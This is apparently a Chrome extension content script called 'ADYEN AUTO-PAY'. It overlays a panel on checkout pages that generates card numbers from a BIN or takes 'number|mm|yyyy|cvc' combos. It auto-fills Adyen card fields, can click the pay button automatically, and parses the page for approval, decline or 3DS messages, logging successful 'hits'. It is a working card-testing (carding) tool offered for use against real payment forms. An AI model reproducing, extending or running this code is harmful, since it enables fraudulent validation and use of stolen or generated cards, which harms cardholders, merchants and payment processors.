"use strict";

(function () {
  const cfgKey = "adyenPayload";
  const frameId = "f" + Math.random().toString(36).slice(2, 9);
  const isTop = window.self === window.top;
  let running = false;
  let stopRequested = false;
  let hitCount = 0;
  let currentTick = "";

  function getConfig() {
    return new Promise((resolve) => {
      chrome.storage.local.get([cfgKey], (res) => {
        resolve(res[cfgKey] || null);
      });
    });
  }

  function setConfig(cfg) {
    return new Promise((resolve) => {
      chrome.storage.local.set({ [cfgKey]: cfg }, resolve);
    });
  }

  function setNativeValue(el, value) {
    const proto = el instanceof HTMLTextAreaElement
      ? HTMLTextAreaElement.prototype
      : el instanceof HTMLSelectElement
        ? HTMLSelectElement.prototype
        : HTMLInputElement.prototype;
    const desc = Object.getOwnPropertyDescriptor(proto, "value");
    if (!desc) return;
    desc.set.call(el, value);
    el.dispatchEvent(new Event("input", { bubbles: true }));
    el.dispatchEvent(new Event("change", { bubbles: true }));
    el.dispatchEvent(new Event("blur", { bubbles: true }));
  }

  function attrsOf(el) {
    return ((el.id || "") + " " + (el.name || "") + " " +
      (el.getAttribute("aria-label") || "") + " " +
      (el.getAttribute("data-fieldtype") || "") + " " +
      (el.getAttribute("autocomplete") || "") + " " +
      (el.className || "")).toLowerCase();
  }

  function classifyField(el) {
    const s = attrsOf(el);
    if (/(card\s*[-_ ]*number|ccnum|cc[-_ ]number|\bpan\b|encrypted\w*(number|pan))/.test(s)) return "number";
    if (/(expiry|expiration)[-_ ]*(month)?|encrypted\w*month|expmonth/.test(s) && !/year/.test(s)) return "month";
    if (/(expiry|expiration)[-_ ]*year|encrypted\w*year|expyear/.test(s) || (/exp/.test(s) && /year/.test(s))) return "year";
    if (/(cvc|cvv|csc|security)[-_ ]*(code)?/.test(s)) return "cvc";
    return null;
  }

  function visibleInputs() {
    return Array.from(document.querySelectorAll("input")).filter(
      (i) => i.type !== "hidden" && (i.offsetParent !== null || i.type === "tel" || i.type === "text")
    );
  }

  function fillOwned(card) {
    const fields = { number: false, month: false, year: false, cvc: false };
    let any = false;

    for (const inp of visibleInputs()) {
      const kind = classifyField(inp);
      if (!kind) continue;
      if (kind === "number" && !fields.number) {
        setNativeValue(inp, card.number);
        fields.number = true; any = true;
      } else if (kind === "month" && !fields.month) {
        setNativeValue(inp, (card.month || card.expiryMonth || "12").toString().padStart(2, "0"));
        fields.month = true; any = true;
      } else if (kind === "year" && !fields.year) {
        setNativeValue(inp, (card.year || card.expiryYear || "2029").toString().slice(-2));
        fields.year = true; any = true;
      } else if (kind === "cvc" && !fields.cvc) {
        setNativeValue(inp, card.cvc || "");
        fields.cvc = true; any = true;
      }
    }

    if (!fields.month && !fields.year) {
      const expSel = document.querySelector('input[autocomplete="cc-exp"], input[name*="expiry"], input[id*="expiry"]');
      if (expSel) {
        setNativeValue(expSel,
          (card.month || card.expiryMonth).padStart(2, "0") + "/" +
          (card.year || card.expiryYear).slice(-2));
        fields.month = true; fields.year = true; any = true;
      }
    }

    if (!fields.number) {
      const numEl = document.querySelector('input[autocomplete="cc-number"], input[name*="cardNumber"], input[id*="cardNumber"]');
      if (numEl) {
        setNativeValue(numEl, card.number);
        fields.number = true; any = true;
      }
    }

    if (!fields.cvc) {
      const cvcEl = document.querySelector('input[autocomplete="cc-csc"], input[name*="securityCode"], input[name*="cvc"]');
      if (cvcEl) {
        setNativeValue(cvcEl, card.cvc);
        fields.cvc = true; any = true;
      }
    }

    const holder = document.querySelector(
      'input[name*="holder"], input[id*="holder"], input[autocomplete="cc-name"]'
    );
    if (holder) setNativeValue(holder, card.holder || "JOHN DOE");

    return { fields, any };
  }

  function frameReportKey(pref, id) {
    return pref + "_" + id;
  }

  function report(pref, obj) {
    chrome.storage.local.set({ [frameReportKey(pref, frameId)]: obj });
  }

  function clearReports(pref) {
    chrome.storage.local.get(null, (all) => {
      const toDel = Object.keys(all).filter((k) => k.indexOf(pref) === 0);
      if (toDel.length) chrome.storage.local.remove(toDel);
    });
  }

  function summarize(pref) {
    return new Promise((resolve) => {
      chrome.storage.local.get(null, (all) => {
        const agg = { number: false, month: false, year: false, cvc: false, any: false, frames: 0, texts: [] };
        Object.keys(all).forEach((k) => {
          if (k.indexOf(pref) !== 0) return;
          const r = all[k];
          if (!r || r.tick === undefined || r.tick !== currentTick) return;
          agg.frames++;
          if (r.fields) {
            ["number", "month", "year", "cvc"].forEach((f) => {
              if (r.fields[f]) agg[f] = true;
            });
            if (r.any) agg.any = true;
          }
          if (r.text) agg.texts.push(r.text);
        });
        resolve(agg);
      });
    });
  }

  function sleep(ms) {
    return new Promise((r) => setTimeout(r, ms));
  }

  async function waitReports(pref, minWait, maxWait) {
    const start = Date.now();
    let lastCount = -1;
    let lastChange = Date.now();
    await sleep(700);
    while (Date.now() - start < (maxWait || 7000)) {
      const s = await summarize(pref);
      if (s.frames > 0 && s.frames !== lastCount) {
        lastCount = s.frames;
        lastChange = Date.now();
      }
      if (s.frames > 0 && Date.now() - lastChange > 550) return s;
      if (Date.now() - start >= (minWait || 1800) && s.frames > 0) return s;
      await sleep(250);
    }
    return summarize(pref);
  }

  chrome.storage.onChanged.addListener((changes, area) => {
    if (area !== "local") return;

    const ff = changes["nono_ff"];
    if (ff && ff.newValue && ff.newValue.card) {
      currentTick = ff.newValue.tick;
      const r = fillOwned(ff.newValue.card);
      report("nono_ff", { tick: ff.newValue.tick, fields: r.fields, any: r.any });
      return;
    }

    const dt = changes["nono_detect"];
    if (dt && dt.newValue) {
      currentTick = dt.newValue.tick;
      const text = document.body ? document.body.innerText.slice(0, 4000) : "";
      report("nono_dt", { tick: dt.newValue.tick, text: text });
      return;
    }

    const dbg = changes["nono_dbg"];
    if (dbg && dbg.newValue) {
      currentTick = dbg.newValue.tick;
      const inputs = visibleInputs().map((i) => ({
        t: i.type,
        n: i.name || "",
        id: i.id || "",
        al: i.getAttribute("aria-label") || "",
        ac: i.getAttribute("autocomplete") || "",
        ft: i.getAttribute("data-fieldtype") || "",
        cls: (i.className || "").slice(0, 40),
        vis: !!(i.offsetWidth || i.offsetHeight)
      }));
      const txt = JSON.stringify({ url: location.href.slice(0, 140), inputs: inputs, total: document.querySelectorAll("input").length }).slice(0, 3000);
      report("nono_dbg", { tick: dbg.newValue.tick, text: txt });
    }
  });

  function ensureCardMethod() {
    const methods = Array.from(document.querySelectorAll(
      '.adyen-checkout__payment-method, [data-testid*="payment-method"], [class*="payment-method"]'
    ));
    for (const m of methods) {
      const txt = (m.innerText || "").toLowerCase();
      if (/card|credit|debit/.test(txt)) {
        const open = m.querySelector(".adyen-checkout__payment-method__details") &&
          m.querySelector(".adyen-checkout__payment-method__details").offsetWidth > 0;
        if (!open) {
          m.click();
          return true;
        }
      }
    }
    const btns = Array.from(document.querySelectorAll("button, label, div[role='button']"));
    for (const b of btns) {
      const t = (b.innerText || "").replace(/\s+/g, " ").trim().toLowerCase();
      if (/^(credit|debit)?\s*(card|pay by card)$/.test(t) && b.offsetParent) {
        b.click();
        return true;
      }
    }
    return false;
  }

  function findPayButton() {
    const buttons = Array.from(document.querySelectorAll("button, [role='button'], a"));
    for (const b of buttons) {
      const rect = b.getBoundingClientRect();
      if (rect.width === 0 && rect.height === 0) continue;
      const text = ((b.innerText || "") + " " + (b.getAttribute("aria-label") || "")).trim().toLowerCase();
      if (/^(pay|pay now|pay \$?\d|proceed to pay|confirm|submit|place order)/i.test(text) ||
        /adyen-checkout__button/.test(b.className || "")) {
        return b;
      }
    }
    return null;
  }

  function submitClick(tries = 0) {
    const btn = findPayButton();
    if (btn) {
      btn.click();
      return true;
    }
    if (tries < 6) {
      return new Promise((r) => setTimeout(() => r(submitClick(tries + 1)), 900));
    }
    return false;
  }

  function topDocText() {
    return document.body ? (document.body.innerText || "").toLowerCase() : "";
  }

  function topDocHtml() {
    return document.documentElement ? document.documentElement.innerHTML : "";
  }

  function detectResult(texts) {
    const all = (topDocText() + " " + texts.join(" ")).toLowerCase();
    const html = topDocHtml();

    if (/adyen-checkout__threeds2|threeds2|3d-secure|\b3ds\b|threeds|challenge/.test(html)) {
      return { ok: true, label: "3DS CHALLENGE" };
    }
    const good = [
      "thank you", "payment successful", "payment complete", "approved",
      "processing", "redirecting", "almost done", "your payment was made",
      "payment succeeded", "success", "payment received"
    ];
    for (const g of good) {
      if (all.includes(g)) return { ok: true, label: "PROCESSED" };
    }
    const bad = [
      "declined", "refused", "invalid card number", "unsupported card", "expired",
      "not supported", "no sufficient", "insufficient", "invalid number",
      "cannot be used", "rejected", "failed", "do not honor",
      "card number is invalid", "security code is incorrect", "card expired",
      "payment not successful", "please try again"
    ];
    for (const b of bad) {
      if (all.includes(b)) return { ok: false, label: b.toUpperCase() };
    }
    return null;
  }

  function buildPanel() {
    if (document.getElementById("nono-panel")) return;

    const panel = document.createElement("div");
    panel.id = "nono-panel";
    panel.style.cssText = [
      "position:fixed", "top:10px", "right:10px", "z-index:2147483647",
      "width:min(320px, calc(100vw - 20px))", "background:#0b0e13",
      "color:#e6e6e6", "font-family:Segoe UI, Roboto, sans-serif",
      "border:1px solid #1f2a33", "border-radius:14px", "padding:0",
      "box-shadow:0 12px 40px rgba(0,0,0,.65)", "font-size:12px",
      "user-select:none", "overflow:hidden", "transition:transform .28s ease,opacity .28s ease",
      "opacity:0", "transform:translateX(40px)", "max-height:calc(100vh - 20px)",
      "display:flex", "flex-direction:column"
    ].join(";");

    panel.innerHTML = `
      <div style="background:linear-gradient(135deg,#00d1b2,#00a88c);color:#00110d;padding:10px 12px;display:flex;justify-content:space-between;align-items:center">
        <div style="display:flex;align-items:center;gap:8px">
          <span style="font-size:16px">&#9889;</span>
          <b style="font-size:13px;letter-spacing:.5px">ADYEN AUTO-PAY</b>
          <span id="nono-ver" style="font-size:9px;background:#00110d33;color:#00110d;padding:2px 6px;border-radius:8px">1.3</span>
        </div>
        <div style="display:flex;gap:6px">
          <button id="nono-dbg" title="Debug DOM" style="background:#00110d22;border:none;color:#00110d;cursor:pointer;width:22px;height:22px;border-radius:6px;font-size:10px;line-height:1;font-weight:700">DBG</button>
          <button id="nono-min" title="Minimize" style="background:#00110d22;border:none;color:#00110d;cursor:pointer;width:22px;height:22px;border-radius:6px;font-size:12px;line-height:1">&#8211;</button>
        </div>
      </div>

      <div style="padding:12px;display:flex;flex-direction:column;gap:6px">
        <div style="display:flex;gap:6px">
          <div style="flex:1">
            <label style="font-size:9px;text-transform:uppercase;color:#6b7b8d">Custom BIN</label>
            <input id="nono-bin" type="text" placeholder="4400661989645" maxlength="19" inputmode="numeric"
              style="width:100%;box-sizing:border-box;padding:8px;background:#131a22;color:#e6e6e6;border:1px solid #23303c;border-radius:8px;font-size:13px;outline:none">
          </div>
          <div style="width:88px">
            <label style="font-size:9px;text-transform:uppercase;color:#6b7b8d">Card Len</label>
            <select id="nono-len" style="width:100%;padding:8px;background:#131a22;color:#e6e6e6;border:1px solid #23303c;border-radius:8px;font-size:12px;outline:none">
              <option value="16">16</option>
              <option value="15">15</option>
              <option value="19">19</option>
            </select>
          </div>
        </div>

        <div style="display:flex;gap:6px;align-items:flex-end">
          <div style="flex:1">
            <label style="font-size:9px;text-transform:uppercase;color:#6b7b8d">Or Full Combo</label>
            <input id="nono-combo" type="text" placeholder="number|mm|yyyy|cvc" inputmode="numeric"
              style="width:100%;box-sizing:border-box;padding:8px;background:#131a22;color:#e6e6e6;border:1px solid #23303c;border-radius:8px;font-size:13px;outline:none">
          </div>
          <button id="nono-clear" title="Clear combo" style="background:#23303c;border:none;color:#fff;cursor:pointer;padding:8px 10px;border-radius:8px;font-size:12px">&#10005;</button>
        </div>

        <div style="display:flex;gap:6px;align-items:center;font-size:11px;margin-top:2px">
          <label style="display:flex;align-items:center;gap:4px;color:#8fa3b5;cursor:pointer">
            <input type="checkbox" id="nono-autosubmit" style="width:auto;accent-color:#00d1b2"> Auto Submit
          </label>
          <label style="display:flex;align-items:center;gap:4px;color:#8fa3b5;cursor:pointer">
            <input type="checkbox" id="nono-autoonload" style="width:auto;accent-color:#00d1b2"> Auto on Load
          </label>
        </div>

        <div style="display:flex;gap:6px;margin-top:4px">
          <button id="nono-start" style="flex:2;padding:11px;background:linear-gradient(135deg,#00d1b2,#00a88c);color:#00110d;border:none;border-radius:9px;font-weight:700;font-size:13px;cursor:pointer">&#9654; START HIT</button>
          <button id="nono-stop" style="flex:1;padding:11px;background:#23303c;color:#e6e6e6;border:none;border-radius:9px;font-weight:600;font-size:12px;cursor:pointer">STOP</button>
        </div>

        <div style="display:flex;justify-content:space-between;font-size:11px;margin-top:2px">
          <span style="color:#00d1b2" id="nono-log">Ready, Chief.</span>
          <span style="color:#ffcc00" id="nono-count">Hits: 0</span>
        </div>

        <div id="nono-results" style="max-height:150px;overflow-y:auto;font-size:11px;border-top:1px solid #1a2430;padding-top:6px"></div>

        <div style="display:flex;justify-content:flex-end">
          <button id="nono-close" style="background:none;border:none;color:#5a6b7c;cursor:pointer;font-size:11px;padding:2px 6px;border-radius:6px">Remove</button>
        </div>
      </div>
    `;

    document.body.appendChild(panel);

    const pill = document.createElement("div");
    pill.id = "nono-pill";
    pill.style.cssText = [
      "position:fixed", "right:10px", "top:30%", "z-index:2147483647",
      "width:48px", "height:48px", "border-radius:14px",
      "background:linear-gradient(135deg,#00d1b2,#00a88c)", "color:#00110d",
      "display:none", "align-items:center", "justify-content:center",
      "font-size:20px", "cursor:pointer", "box-shadow:0 6px 20px rgba(0,0,0,.5)",
      "touch-action:none", "user-select:none", "flex-direction:column", "gap:0"
    ].join(";");
    pill.innerHTML = '<span style="line-height:1">&#9889;</span><span id="nono-pill-count" style="font-size:8px;font-weight:700;line-height:1">0</span>';
    document.body.appendChild(pill);

    const box = panel.querySelector("#nono-results");
    const log = panel.querySelector("#nono-log");
    const count = panel.querySelector("#nono-count");
    const pillCount = document.getElementById("nono-pill-count");

    setTimeout(() => {
      panel.style.opacity = "1";
      panel.style.transform = "translateX(0)";
    }, 40);

    function minimize() {
      panel.style.transform = "translateX(40px)";
      panel.style.opacity = "0";
      setTimeout(() => {
        panel.style.display = "none";
        pill.style.display = "flex";
      }, 280);
    }

    function restore() {
      pill.style.display = "none";
      panel.style.display = "flex";
      requestAnimationFrame(() => {
        panel.style.opacity = "1";
        panel.style.transform = "translateX(0)";
      });
    }

    let dragY = 0;
    let dragging = false;
    pill.addEventListener("pointerdown", (e) => {
      dragging = true;
      dragY = e.clientY - pill.offsetTop;
      pill.setPointerCapture(e.pointerId);
    });
    pill.addEventListener("pointermove", (e) => {
      if (!dragging) return;
      const y = e.clientY - dragY;
      const maxY = window.innerHeight - 56;
      pill.style.top = Math.min(Math.max(8, y), maxY) + "px";
    });
    pill.addEventListener("pointerup", (e) => {
      dragging = false;
      if (pill.hasPointerCapture && pill.hasPointerCapture(e.pointerId)) pill.releasePointerCapture(e.pointerId);
    });
    pill.addEventListener("click", () => {
      if (dragging) return;
      restore();
    });

    const el = (id) => panel.querySelector(id);

    function savePanelState() {
      const cfg = {
        bin: el("#nono-bin").value.trim(),
        combo: el("#nono-combo").value.trim(),
        cardLength: parseInt(el("#nono-len").value, 10) || 16,
        autoSubmit: el("#nono-autosubmit").checked,
        autoOnLoad: el("#nono-autoonload").checked,
        enabled: true
      };
      setConfig(cfg);
      return cfg;
    }

    function logMsg(m) { log.textContent = m; }
    function updateCount() {
      count.textContent = "Hits: " + hitCount;
      pillCount.textContent = String(hitCount);
    }
    function logResult(icon, text, color, mono) {
      const line = document.createElement("div");
      line.style.cssText = "padding:3px 0;border-bottom:1px solid #141c26;color:" + color + ";white-space:nowrap;overflow:hidden;text-overflow:ellipsis;display:flex;gap:4px;align-items:center";
      if (mono) line.style.color = "#e6e6e6";
      line.innerHTML = '<span style="flex-shrink:0">' + icon + '</span><span style="overflow:hidden;text-overflow:ellipsis">' + text + '</span>';
      box.prepend(line);
      while (box.children.length > 12) box.lastChild.remove();
    }

    async function debugDump() {
      logMsg("Gathering frame inventory...");
      const tick = Date.now() + Math.floor(Math.random() * 1000);
      currentTick = tick;
      clearReports("nono_dbg");
      chrome.storage.local.set({ nono_dbg: { tick: tick } });
      await sleep(1400);
      const s = await summarize("nono_dbg");

      const iframes = Array.from(document.querySelectorAll("iframe")).map((f) => ({
        src: (f.src || "").slice(0, 130),
        title: f.title || "",
        h: f.offsetHeight,
        w: f.offsetWidth
      }));
      const top = JSON.stringify({ url: location.href, iframes: iframes, inputs: visibleInputs().length });
      let out = top;
      s.texts.forEach((t, i) => { out += "\n---FRAME " + (i + 1) + "--- " + t; });
      if (!s.texts.length) out += "\n(no frame handlers answered)";

      const line = document.createElement("div");
      line.style.cssText = "padding:3px 0;border-bottom:1px dashed #1a2430;color:#9be;font-size:10px;white-space:pre-wrap;word-break:break-all;max-height:250px;overflow:auto";
      line.textContent = out;
      box.prepend(line);
      logMsg("Debug dump ready. Read the top entry.");
    }

    el("#nono-min").addEventListener("click", minimize);
    el("#nono-dbg").addEventListener("click", debugDump);
    el("#nono-close").addEventListener("click", () => {
      panel.style.opacity = "0";
      setTimeout(() => panel.remove(), 200);
    });
    el("#nono-clear").addEventListener("click", () => {
      el("#nono-combo").value = "";
      savePanelState();
    });
    el("#nono-bin").addEventListener("input", savePanelState);
    el("#nono-combo").addEventListener("input", savePanelState);
    el("#nono-len").addEventListener("change", savePanelState);
    el("#nono-autosubmit").addEventListener("change", savePanelState);
    el("#nono-autoonload").addEventListener("change", savePanelState);

    el("#nono-start").addEventListener("click", startHit);
    el("#nono-stop").addEventListener("click", () => {
      stopRequested = true;
      logMsg("Stopped by Chief.");
    });

    function startHit() {
      const bin = el("#nono-bin").value.trim();
      const combo = el("#nono-combo").value.trim();
      if (!bin && !combo) {
        logMsg("Give me a BIN or combo first, Chief.");
        return;
      }
      savePanelState();
      stopRequested = false;
      hitCount = 0;
      updateCount();
      box.innerHTML = "";
      logMsg("Hitting...");
      runHits();
    }

    window.__nonoLog = logMsg;
    window.__nonoUpdate = updateCount;
    window.__nonoResult = logResult;
    window.__nonoRestore = restore;
  }

  function parseCombo(combo) {
    const parts = combo.split("|").map((s) => s.trim());
    return { number: (parts[0] || "").replace(/\s/g, ""), month: parts[1] || "", year: parts[2] || "", cvc: parts[3] || "" };
  }

  async function runHits() {
    const cfg = await getConfig();
    if (!cfg) return;
    running = true;

    while (!stopRequested && running) {
      let card;
      if (cfg.combo) {
        const p = parseCombo(cfg.combo);
        card = { number: p.number, month: p.month, year: p.year, cvc: p.cvc, holder: cfg.holder || "JOHN DOE" };
      } else {
        card = window.CardGen.genCard(cfg.bin.replace(/\s/g, ""), { length: cfg.cardLength || 16 });
        card.holder = cfg.holder || "JOHN DOE";
        card.month = card.expiryMonth;
        card.year = card.expiryYear;
      }

      ensureCardMethod();
      await sleep(600);

      const tick = Date.now() + Math.floor(Math.random() * 1000);
      currentTick = tick;
      clearReports("nono_ff");
      chrome.storage.local.set({ nono_ff: { card: card, tick: tick } });
      window.__nonoLog && window.__nonoLog("Hit #" + (hitCount + 1) + " -> " + card.number);

      const st = await waitReports("nono_ff", 1800, 9000);

      let submitted = false;
      if (cfg.autoSubmit && st.any) {
        submitted = !!submitClick();
        if (!submitted) window.__nonoLog && window.__nonoLog("No pay button yet, retrying submit...");
      }

      const dtTick = Date.now() + Math.floor(Math.random() * 1000);
      currentTick = dtTick;
      clearReports("nono_dt");
      chrome.storage.local.set({ nono_detect: { tick: dtTick } });
      const dt = await waitReports("nono_dt", 1000, 4500);

      let res = detectResult(dt.texts);
      if (!res) {
        if (!st.any) res = { ok: false, label: "FIELDS NOT FOUND" };
        else if (!submitted) res = { ok: false, label: "PAY BUTTON MISSED" };
        else res = { ok: false, label: "NO VISIBLE RESULT" };
      }

      hitCount++;
      window.__nonoUpdate && window.__nonoUpdate();
      const icon = res.ok ? "&#9989;" : "&#10060;";
      const color = res.ok ? "#00d1b2" : "#ff5d5d";
      window.__nonoResult && window.__nonoResult(icon,
        "N" + hitCount + " " + card.number + " " + card.month + "/" + card.year.slice(-2) + " " + card.cvc + " -> " + res.label, color);

      if (res.ok && (res.label === "PROCESSED" || res.label === "3DS CHALLENGE")) {
        window.__nonoLog && window.__nonoLog("It moved Chief: " + res.label + ". Stopping.");
        stopRequested = true;
      }

      await sleep(1200);
    }

    running = false;
    window.__nonoLog && window.__nonoLog("Cycle stopped.");
  }

  async function init() {
    if (!isTop) return;
    buildPanel();
    const cfg = await getConfig();
    if (cfg) {
      const ids = ["nono-bin", "nono-combo", "nono-len", "nono-autosubmit", "nono-autoonload"];
      const vals = [cfg.bin || "", cfg.combo || "", String(cfg.cardLength || 16), !!cfg.autoSubmit, !!cfg.autoOnLoad];
      ids.forEach((id, i) => {
        const e = document.getElementById(id);
        if (e) {
          if (e.type === "checkbox") e.checked = vals[i];
          else e.value = vals[i];
        }
      });
      if (cfg.enabled && cfg.autoOnLoad) {
        setTimeout(() => {
          const b = document.getElementById("nono-start");
          if (b) b.click();
        }, 1800);
      }
    }
  }

  setTimeout(init, 700);
})();